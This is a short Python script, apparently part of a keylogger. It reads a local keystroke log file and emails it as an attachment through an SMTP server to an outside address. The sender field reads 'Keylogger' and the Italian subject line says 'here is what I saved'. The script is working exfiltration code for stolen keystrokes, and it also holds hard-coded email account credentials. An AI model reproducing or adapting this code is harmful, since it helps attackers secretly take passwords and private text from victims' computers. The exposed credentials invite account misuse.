import time
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
import os

#ora = time.time()
#dopo = ora + 1
username = os.getlogin()
#while(time.time() % dopo == 0):
server = smtplib.SMTP('64.233.184.108')
server.ehlo()
server.starttls()
server.login('pieroangela827@gmail.com', 'piero728173py')

msg = MIMEMultipart()
msg['From'] = 'Keylogger'
msg['To'] = 'dorak36267@pxjtw.com'
msg['Subject'] = 'Ecco cosa ho salvato'

msg.attach(MIMEText('Ecco a te', 'plain'))

filename = 'C:/Users/anton/Documents/mylog.txt'
attachment = open(filename, 'rb')

p = MIMEBase('application', 'octet-stream')
p.set_payload(attachment.read())

encoders.encode_base64(p)
p.add_header('Content-Disposition', f'attachment; filename = {filename}')
msg.attach(p)

text = msg.as_string()
server.sendmail('pieroangela827@gmail.com', 'dorak36267@pxjtw.com', text)